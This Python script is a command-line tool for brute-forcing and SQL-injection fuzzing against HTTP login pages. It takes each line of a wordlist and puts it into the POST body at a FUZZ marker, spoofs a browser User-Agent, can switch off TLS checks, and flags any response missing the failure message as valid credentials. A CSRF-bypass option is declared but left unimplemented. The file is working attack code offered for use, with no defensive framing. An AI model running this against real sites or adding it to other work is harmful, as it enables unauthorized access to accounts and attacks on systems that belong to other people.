import requests
import argparse
import os

def main():
    parser = argparse.ArgumentParser(description='HTTP login page Brute Force with SQL Queries by Sajibu')

    parser.add_argument('-u', '--url', type=str, required=True, help='Supply the login page')
    parser.add_argument('-w', '--wordlist', type=str, required=True, help='Wordlist path')
    parser.add_argument('-r', '--request', type=str, required=True, help='Request body, replace injectable string with FUZZ keyword')
    parser.add_argument('-H', '--header', type=str, required=False, help='Any header')
    parser.add_argument('-e', '--error', type=str, required=True, help='Failed login attempt message')
    parser.add_argument('-c', '--cookie', type=str, required=False, help='Set Cookie')
    parser.add_argument('-s', '--ssl', type=bool, required=False, default=False, help='No SSL/TLS check')
    parser.add_argument('-C', '--csrf', type=bool, required=False, default=False, help='Bypass CSRF protection')
    parser.add_argument('-v', '--verbose', type=bool, required=False, default=False, help='Print header and post response to the screen')

    args = parser.parse_args()

    if not os.path.isfile(args.wordlist):
        print(f"The wordlist file {args.wordlist} does not exist.")
        exit(1)

    with open(args.wordlist, 'r') as file:
        wordlist = file.read().splitlines()

    for word in wordlist:
        request_body = args.request.replace('FUZZ', word)
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}

        if args.header:
            try:
                header_key, header_value = args.header.split(':')
                headers[header_key] = header_value.strip()
            except ValueError:
                print(f"Invalid header format, it should be in 'key:value' format.")
                continue

        cookies = {}

        if args.cookie:
            try:
                cookie_key, cookie_value = args.cookie.split('=')
                cookies[cookie_key] = cookie_value.strip()
            except ValueError:
                print(f"Invalid cookie format, it should be in 'key=value' format.")
                continue

        if args.csrf:
            # To be implemented: Bypass CSRF protection
            pass

        try:
            response = requests.post(args.url, headers=headers, cookies=cookies, data=request_body, verify=not args.ssl)
            response.raise_for_status()
        except requests.exceptions.RequestException as err:
            print(f"Error: {err}")
            continue

        if args.error not in response.text:
            print(f"Found valid credentials: {request_body}")

        if args.verbose:
            print(response.text)

if __name__ == '__main__':
    main()
